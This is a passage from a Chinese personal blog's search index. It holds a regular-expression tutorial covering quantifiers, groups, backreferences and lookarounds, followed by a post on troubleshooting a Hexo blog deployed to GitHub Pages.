匹配以字母a开头的单词——先是某个单词开始处(\\b)，然后是字母a,然后是任意数量的字母或数字(\\w*)，最后是单词结束处(\\b)。(* 匹配零次或任意次，后面会讲)</p>\n<h1>字符转义</h1>\n<p>如果你想查找元字符本身的话，比如你查找.,或者*,就出现了问题：你没办法指定它们，因为它们会被解释成别的意思。这时你就得使用\\来取消这些字符的特殊意义。因此，你应该使用.和*。当然，要查找\\本身，你也得用\\.</p>\n<p>示例：<a href=\"http://deerchao.xn--netdeerchao-1p1se075d.net\" target=\"_blank\" rel=\"noopener\">deerchao.net匹配deerchao.net</a>，C:\\Windows匹配C:\\Windows。</p>\n<h1>重复</h1>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">代码</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">+</td>\n<td style=\"text-align:center\">重复一次或更多次</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">?</td>\n<td style=\"text-align:center\">重复零次或一次</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">{n}</td>\n<td style=\"text-align:center\">重复n次</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">{n,}</td>\n<td style=\"text-align:center\">重复n次或更多次</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">{n,m}</td>\n<td style=\"text-align:center\">重复n到m次</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">*</td>\n<td style=\"text-align:center\">重复零次或更多次</td>\n</tr>\n</tbody>\n</table>\n<p>示例：一个网站如果要求你填写的QQ号必须为5位到12位数字时，可以使用：^\\d{5,12}$</p>\n<h1>字符类</h1>\n<p>如果你想匹配没有预定义元字符的字符集合(比如元音字母a,e,i,o,u)，只需要在方括号里列出它们就行了，像[aeiou]就匹配任何一个英文元音字母，[.?!]匹配标点符号(.或?或!)。</p>\n<p>示例：(?0\\d{2}[) -]?\\d{8}</p>\n<p>这个表达式可以匹配几种格式的电话号码，像*(010)88886666*，或<em>022-22334455</em>，或<em>02912345678</em>等。我们对它进行一些分析吧：首先是一个转义字符(,它能出现0次或1次(?),然后是一个0，后面跟着2个数字(\\d{2})，然后是)或-或空格中的一个，它出现1次或不出现(?)，最后是8个数字(\\d{8})。（“(”和“)”也是元字符，所以在这里需要转义）</p>\n<h1>分支条件</h1>\n<p>正则表达式里的<strong>分枝条件</strong>指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，具体方法是用|把不同的规则分隔开。</p>\n<p>示例：0\\d{2}-\\d{8}|0\\d{3}-\\d{7}这个表达式能匹配两种以连字号分隔的电话号码：一种是三位区号，8位本地号(如010-12345678)，一种是4位区号，7位本地号(0376-2233445)。</p>\n<h1>分组</h1>\n<p>如果想要重复多个字符，你可以用小括号来指定<strong>子表达式</strong>(也叫做<strong>分组</strong>)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作(后面会有介绍)。</p>\n<p>示例：((2[0-4]\\d|25[0-5]|[01]?\\d\\d?).){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)  可以用来匹配ip地址（ip地址取值只能在0-255，使用分支来列出三种情况，中间&quot;.&quot;用分组解决。</p>\n<h1>反义</h1>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">代码</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">\\W</td>\n<td style=\"text-align:center\">匹配任意不是字母，数字，下划线，汉字的字符</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">\\S</td>\n<td style=\"text-align:center\">匹配任意不是空白符的字符</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">\\D</td>\n<td style=\"text-align:center\">匹配任意非数字的字符</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">\\B</td>\n<td style=\"text-align:center\">匹配不是单词开头或结束的位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">[^X]</td>\n<td style=\"text-align:center\">匹配除了x以外的任意字符</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">[^aeiou]</td>\n<td style=\"text-align:center\">匹配除了aeiou这几个字母以外的任意字符</td>\n</tr>\n</tbody>\n</table>\n<p>示例：\\S+  匹配不包含空白符的字符串</p>\n<h1>后向引用</h1>\n<p>使用小括号指定一个子表达式后，<strong>匹配这个子表达式的文本</strong>(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。默认情况下，每个分组会自动拥有一个<strong>组号</strong>，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。<strong>后向引用</strong>用于重复搜索前面某个分组匹配的文本。</p>\n<p>示例：\\b(\\w+)\\b\\s+\\1\\b可以用来匹配重复的单词，像<em>go go</em>, 或者<em>kitty kitty</em>。这个表达式首先是一个单词，也就是单词开始处和结束处之间的多于一个的字母或数字(\\b(\\w+)\\b)，这个单词会被捕获到编号为1的分组中，然后是1个或几个空白符(\\s+)，最后是分组1中捕获的内容（也就是前面匹配的那个单词）(\\1)。</p>\n<h1>零宽断言</h1>\n<p>查找在某些内容(但并不包括这些内容)之前或之后的东西，也就是说它们像\\b,^,$那样用于指定一个位置，这个位置应该满足一定的条件(即断言)，因此它们也被称为<strong>零宽断言</strong>。</p>\n<p>示例：(?=exp)也叫<strong>零宽度正预测先行断言</strong>，它断言自身出现的位置的后面能匹配表达式exp。比如\\b\\w+(?=ing\\b)，匹配以ing结尾的单词的前面部分(除了ing以外的部分)。</p>\n<p>(?&lt;=exp)也叫<strong>零宽度正回顾后发断言</strong>，它断言自身出现的位置的前面能匹配表达式exp。比如(?&lt;=\\bre)\\w+\\b会匹配以re开头的单词的后半部分(除了re以外的部分)</p>\n<h1>负向零宽断言</h1>\n<p><strong>零宽度负预测先行断言</strong>(?!exp)，断言此位置的后面不能匹配表达式exp。例如：\\d{3}(?!\\d)匹配三位数字，而且这三位数字的后面不能是数字；\\b((?!abc)\\w)+\\b匹配不包含连续字符串abc的单词。</p>\n<p>同理，我们可以用(?&lt;!exp),<strong>零宽度负回顾后发断言</strong>来断言此位置的前面不能匹配表达式exp：(?&lt;![a-z])\\d{7}匹配前面不是小写字母的七位数字。</p>\n<h1>注释</h1>\n<p>小括号的另一种用途是通过语法(?#comment)来包含注释。例如：2[0-4]\\d(?#200-249)|25<a href=\"?#250-255\">0-5</a>|[01]?\\d\\d?(?#0-199)。</p>\n<p>要包含注释的话，最好是启用“忽略模式里的空白符”选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。启用这个选项后，在#后面到这一行结束的所有文本都将被当成注释忽略掉。</p>\n<h1>贪婪与懒惰</h1>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">代码</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">*？</td>\n<td style=\"text-align:center\">重复任意次，但尽可能少重复</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">+？</td>\n<td style=\"text-align:center\">重复1次或更多次，但尽可能少重复</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">??</td>\n<td style=\"text-align:center\">重复0次或1次，但尽可能少重复</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">{n,m}?</td>\n<td style=\"text-align:center\">重复n到m次，但尽可能少重复</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">{n,}?</td>\n<td style=\"text-align:center\">重复n次以上，但尽可能少重复</td>\n</tr>\n</tbody>\n</table>\n<h1>参考资料</h1>\n<p><a href=\"http://deerchao.net/tutorials/regex/regex.htm\" target=\"_blank\" rel=\"noopener\">正则表达式30分钟入门教程</a></p>\n<p><a href=\"https://www.regular-expressions.info/\" target=\"_blank\" rel=\"noopener\">专业正则表达式教学网站</a></p>\n","categories":["web入门"],"tags":["正则表达式"]},{"title":"hexo搭博客的坑","url":"https://13m0nade.github.io/2019/07/29/hexo搭博客的坑/","content":"<h1><strong>hexo搭博客的坑</strong></h1>\n<hr>\n<h2 id=\"github\"><a class=\"header-anchor\" href=\"#github\">null</a>GitHub</h2>\n<p>git gitcore必须放入环境变量。<br>\n用hexo搭博客的前提是你要拥有一个GitHub账号，登入创建项目，注意项目名必须为 <strong><a href=\"http://username.github.io\" target=\"_blank\" rel=\"noopener\">username.github.io</a></strong>。创建完后可在右上角setting处github page 看到自己的域名，在浏览器中输入即可访问。（此过程有些缓慢，后期可将自己购买的域名解析到博客）</p>\n<h2 id=\"git\"><a class=\"header-anchor\" href=\"#git\">null</a>git</h2>\n<p>git的作用是部署博客，在安装过程中有一步是选择运行的环境，这里我们选择在git bash下运行（不能在cmd下运行，后续操作须在bash下进行），若一定要在命令行运行可在安装时选择cmd，此模式下会有部分冲突，萌新慎选。</p>\n<h2 id=\"hexo\"><a class=\"header-anchor\" href=\"#hexo\">null</a>hexo</h2>\n<p>hexo的配置是最复杂也是雷区最多的，首先在安装时需要安装插件，网上绝大多数博客只说了npm install，这条指令不能安装所有的插件，就像是把hexo部署到GitHub需要的hexo-deployer-git就无法安装，导致笔者一直无法部署，耗了很长时间，找了无数教程才解决。可以通过npm install hexo-deployer-git --save 安装，其他插件同理。<br>\n要将hexo部署成功需要对_config.yml文件进行修改，其中需要注意的是repository位在github clone处的ssh地址。最坑的来了这里冒号后有两个空格，两个空格，两个空格，重要的事说三遍。</p>\n<h2 id=\"ending\"><a class=\"header-anchor\" href=\"#ending\">null</a>ending</h2>\n<p>配置完之后就可以进行个性化和写博客了，注意每次的修改都需要使用hexo g 生成，hexo d 部署。使用hexo s 在浏览器输入localhost:4000即可预览博客。</p>\n<h2 id=\"报错解决\"><a class=\"header-anchor\" href=\"#报错解决\">null</a>报错解决</h2>\n<p>再部署中出现spawn failed报错，首先检查git是否加入环境变量，然后删除博客目录下.git文件夹。具体操作如下：</p>\n<ol>\n<li>hexo clean</li>\n<li>hexo g</li>\n<li>hexo d</li>\n</ol>\n","categories":["经验分享"],"tags":["萌新入坑"]},{"title":"about","url":"https://13m0nade.github.io/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"https://13m0nade.github.io/category/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"https://13m0nade.github.io/link/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"https://13m0nade.github.io/project/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"https://13m0nade.github.io/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"https://13m0nade.github.io/tag/index.html","content":"","categories":[],"tags":[]}]